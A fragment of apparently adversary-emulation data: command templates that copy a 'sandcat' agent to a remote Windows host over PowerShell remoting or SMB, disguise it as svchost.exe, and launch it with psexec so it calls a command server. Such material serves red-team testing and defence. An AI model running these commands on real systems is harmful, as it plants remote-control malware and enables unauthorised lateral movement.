...
[{'command': '$job = Start-Job -ScriptBlock {\n'
             ...
             '$username, $secstr;\n'
             '  $session = New-PSSession -ComputerName "#{remote.host.name}" '
             '-Credential $cred;\n'
             '  $location = "#{location}";\n'
             '  $exe = "#{exe_name}";\n'
             '  Copy-Item $location.replace($exe, "sandcat.go-windows") '
             '-Destination "C:\\Users\\Public\\svchost.exe" -ToSession '
             '$session;\n'
             '  Start-Sleep -s 5;\n'
             '  Remove-PSSession -Session $session;\n'
             '};\n'
 ...
 {'command': 'net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n'
             '\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} '
             '-accepteula \\\\#{remote.host.name}\n'
             'cmd /c start C:\\Users\\Public\\sandcat.go-windows -server '
             '#{server} -v\n',
